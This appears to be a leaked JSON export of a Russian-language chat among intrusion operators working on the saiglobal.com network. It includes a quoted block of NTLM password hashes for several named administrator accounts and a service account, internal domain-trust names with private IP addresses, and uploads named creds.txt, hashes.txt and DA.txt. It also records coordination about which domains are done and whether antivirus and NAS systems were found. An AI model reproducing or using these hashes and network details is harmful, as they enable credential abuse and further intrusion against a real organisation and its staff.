+          "text": "```\nsaiglobal.com\\adm.bisfra0 aad3b435b51404eeaad3b435b51404ee:6778ead5a63d0e8da0a2235147af85a0\nsaiglobal.com\\adm.brodan0 aad3b435b51404eeaad3b435b51404ee:06290576382001cd1da4c942e9fa0ca6\nsaiglobal.com\\adm.brodav1 aad3b435b51404eeaad3b435b51404ee:4f1ef28113c7375b22d3f31bd294fa4e\nsaiglobal.com\\adm.damben0 aad3b435b51404eeaad3b435b51404ee:dd9507d8ad5d23af29f99fdbe979d72a\nsaiglobal.com\\adm.evamar1 aad3b435b51404eeaad3b435b51404ee:65a8bca59e4205fc94ed31e11f78d4ac\nsaiglobal.com\\adm.kalnic0 aad3b435b51404eeaad3b435b51404ee:d9c4c5a3dca649913994767d6276b9f9\nsaiglobal.com\\adm.turime0 aad3b435b51404eeaad3b435b51404ee:2a0974987cad16892cf57c3f3646e1ea\nsaig.frd.global\\svc.sccmcliinst aad3b435b51404eeaad3b435b51404ee:aa9249f57aba289658fde8afe795fd67\n\n```",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=AqTqJRs2DTrERaaWP",
+          "attachments": [],
+          "ts": "2020-10-06T00:58:27.908Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=AqTqJRs2DTrERaaWP",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dzZYbNXpJAucQx8th",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=GQEJAdZqC2XPm7pez) 2",
+      "ts": "2020-10-07T17:44:08.631Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:44:08.675Z",
+      "attachments": [
+        {
+          "text": "сейчас залью",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=GQEJAdZqC2XPm7pez",
+          "attachments": [],
+          "ts": "2020-10-07T17:30:36.471Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=GQEJAdZqC2XPm7pez",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2WRQ4q3kKoYRZj3yH",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=go37ZE2uk9zwPiWgn) 1",
+      "ts": "2020-10-07T17:44:01.620Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:44:01.657Z",
+      "attachments": [
+        {
+          "text": "я снял там",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=go37ZE2uk9zwPiWgn",
+          "attachments": [],
+          "ts": "2020-10-07T17:30:33.062Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=go37ZE2uk9zwPiWgn",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RZCyNPEpLENgerjq8",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "?",
+      "ts": "2020-10-07T17:43:50.225Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T17:43:50.253Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QWjKtcaRHhHQB7MjB",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "это кто",
+      "ts": "2020-10-07T17:43:47.124Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T17:43:47.157Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Kpi6gStfP7TkMzdDd",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:35.975Z",
+      "msg": "",
+      "file": {
+        "_id": "GfeBRRuHr4xL6DEtk",
+        "name": "ad_computers.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_computers.txt",
+          "title_link": "/file-upload/GfeBRRuHr4xL6DEtk/ad_computers.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:36.013Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fPaL6sTBP66yrKpHw",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:35.972Z",
+      "msg": "",
+      "file": {
+        "_id": "5GFzq6JuJYnEcsBAi",
+        "name": "ad_group.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_group.txt",
+          "title_link": "/file-upload/5GFzq6JuJYnEcsBAi/ad_group.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:36.009Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Eah3W82r78tJ5ryKq",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:35.501Z",
+      "msg": "",
+      "file": {
+        "_id": "cTFC6xxvitXQgmx9y",
+        "name": "ad_ous.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_ous.txt",
+          "title_link": "/file-upload/cTFC6xxvitXQgmx9y/ad_ous.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:35.532Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HwCvNvELKcNacaq7n",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:34.890Z",
+      "msg": "",
+      "file": {
+        "_id": "t7Pp6AicuxKaeqasc",
+        "name": "creds.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "creds.txt",
+          "title_link": "/file-upload/t7Pp6AicuxKaeqasc/creds.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:34.935Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5dArwBCNqw2Jj6hHw",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:34.828Z",
+      "msg": "",
+      "file": {
+        "_id": "fX33PCSpvXcqNxcde",
+        "name": "DA.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "DA.txt",
+          "title_link": "/file-upload/fX33PCSpvXcqNxcde/DA.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:34.865Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "robSLsM78TZEogBtT",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:34.162Z",
+      "msg": "",
+      "file": {
+        "_id": "CQ2x7zCF4GL6Z9WT2",
+        "name": "ad_users.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_users.txt",
+          "title_link": "/file-upload/CQ2x7zCF4GL6Z9WT2/ad_users.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:34.185Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qXSj8aq6YxZXbQvTF",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:33.086Z",
+      "msg": "",
+      "file": {
+        "_id": "gGnLZbiTW2ZLW2act",
+        "name": "subnets.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "subnets.txt",
+          "title_link": "/file-upload/gGnLZbiTW2ZLW2act/subnets.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:33.118Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WP3NmNq4KxAAoDqnE",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:32.952Z",
+      "msg": "",
+      "file": {
+        "_id": "jGMHPcFoQQHBC9YjQ",
+        "name": "hashes.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "hashes.txt",
+          "title_link": "/file-upload/jGMHPcFoQQHBC9YjQ/hashes.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:32.973Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FMEwufBoNiitMBmeZ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T17:43:29.327Z",
+      "msg": "",
+      "file": {
+        "_id": "TvC5e8jMSRpY5j4mB",
+        "name": "trustdmp.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "trustdmp.txt",
+          "title_link": "/file-upload/TvC5e8jMSRpY5j4mB/trustdmp.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:43:29.364Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KWJANW8knXJQeGRkX",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "Успешно отпингованные трасты\n```\nsaig.frd.global [10.210.8.236]\ndatacenter.local [10.225.10.200]\nfrd.global [10.225.12.1]\nSaigProd.local [10.195.100.1]\nc360.local [10.195.43.2]\nlegalco.local [10.195.23.1]\n```",
+      "ts": "2020-10-07T17:39:41.867Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T17:41:40.536Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T17:41:40.532Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "GQEJAdZqC2XPm7pez",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "сейчас залью",
+      "ts": "2020-10-07T17:30:36.471Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:30:36.513Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "go37ZE2uk9zwPiWgn",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "я снял там",
+      "ts": "2020-10-07T17:30:33.062Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:30:33.110Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XbTPyW6xQDmqQnC73",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "там где все требования выполнены",
+      "ts": "2020-10-07T17:26:38.389Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:26:38.425Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "EHgjLTXavaFMfQHto",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "везде найдены АВ, насы и прочее?",
+      "ts": "2020-10-07T17:26:27.674Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T17:26:27.785Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MGqCrFMo4kvu96aGK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "так, тут , получается, отработаны и мы их не трогаем:\ndatcenter.local\nc360.local\nstandard\nlegalco.local\nfrd.global\n\nвсё верно?",
+      "ts": "2020-10-07T17:23:07.782Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T17:23:37.953Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T17:23:37.947Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    }
+  ],
+  "success": true
+}
